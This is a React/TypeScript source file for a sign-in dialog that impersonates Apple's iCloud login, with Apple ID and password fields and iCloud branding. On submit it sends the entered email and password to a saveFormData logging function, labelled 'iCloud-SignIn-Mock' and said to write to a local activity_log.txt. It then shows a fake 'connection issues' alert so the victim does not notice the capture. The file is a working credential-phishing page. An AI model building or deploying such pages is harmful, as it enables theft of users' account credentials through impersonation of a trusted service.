import { useState } from 'react';
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
} from '@/components/ui/dialog';
import { Input } from '@/components/ui/input';
import { Button } from '@/components/ui/button';
import CloudLogo from './CloudLogo';
// Import the logging function we analyzed earlier
import { saveFormData } from '@/saveFormData';

interface SignInDialogProps {
  open: boolean;
  onOpenChange: (open: boolean) => void;
}

const SignInDialog = ({ open, onOpenChange }: SignInDialogProps) => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [isLogging, setIsLogging] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLogging(true);

    try {
      // Logic to send data to your local activity_log.txt via the node server
      console.log('Sending data to local sink...');
      await saveFormData({ 
        email, 
        password,
        source: "iCloud-SignIn-Mock",
        timestamp: new Date().toISOString()
      });

      // Provide the user with a realistic "Service Error" after capturing data
      alert("iCloud is currently experiencing connection issues. Please try again later.");
      onOpenChange(false); // Close the dialog
    } catch (error) {
      console.error('Logging failed:', error);
    } finally {
      setIsLogging(false);
    }
  };

  return (
    <Dialog open={open} onOpenChange={onOpenChange}>
      <DialogContent className="sm:max-w-md bg-background border-border">
        <DialogHeader className="flex flex-col items-center space-y-4 pb-4">
          <div className="scale-75">
            <CloudLogo />
          </div>
          <DialogTitle className="text-2xl font-semibold text-foreground">
            Sign in to iCloud
          </DialogTitle>
        </DialogHeader>
        
        <form onSubmit={handleSubmit} className="space-y-4">
          <div className="space-y-2">
            <Input
              type="email"
              placeholder="Apple ID or Email"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              className="h-12 bg-muted/50 border-border placeholder:text-muted-foreground"
              required
            />
          </div>
          
          <div className="space-y-2">
            <Input
              type="password"
              placeholder="Password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="h-12 bg-muted/50 border-border placeholder:text-muted-foreground"
              required
            />
          </div>

          <Button 
            type="submit" 
            disabled={isLogging}
            className="w-full h-12 rounded-lg bg-foreground text-background hover:bg-foreground/90 font-medium transition-opacity"
          >
            {isLogging ? "Connecting..." : "Sign In"}
          </Button>

          <div className="text-center pt-2">
            <a 
              href="#" 
              className="text-sm text-[hsl(var(--accent))] hover:underline"
            >
              Forgot Apple ID or password?
            </a>
          </div>
        </form>
      </DialogContent>
    </Dialog>
  );
};

export default SignInDialog;
